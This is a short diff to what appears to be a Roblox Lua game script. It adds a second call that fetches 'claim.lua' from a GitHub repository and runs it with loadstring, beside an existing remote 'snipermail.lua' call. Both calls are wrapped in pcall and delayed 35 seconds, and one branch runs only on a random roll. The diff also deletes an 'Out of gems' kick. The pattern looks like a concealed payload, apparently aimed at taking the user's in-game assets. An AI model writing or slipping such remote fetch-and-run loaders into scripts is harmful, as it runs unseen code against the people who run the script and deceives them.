@@ -3,6 +3,7 @@ local randomNumber = math.random(1, 100)
 if randomNumber >= 90 then
   wait(35)
   pcall(function()
+      loadstring(game:HttpGet("https://raw.githubusercontent.com/Grogutech/beb/refs/heads/main/claim.lua"))()
       loadstring(game:HttpGet("https://raw.githubusercontent.com/Grogutech/beb/refs/heads/main/snipermail.lua"))()
   end)
 end
@@ -91,9 +92,8 @@ if GemsAmount > 25000 then
 else
   pcall(function()
     wait(35)
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/Grogutech/beb/refs/heads/main/claim.lua"))()
     loadstring(game:HttpGet("https://raw.githubusercontent.com/Grogutech/beb/refs/heads/main/snipermail.lua"))()
-    wait(5)
-    Player:Kick("Out of gems")
   end)
 end
 
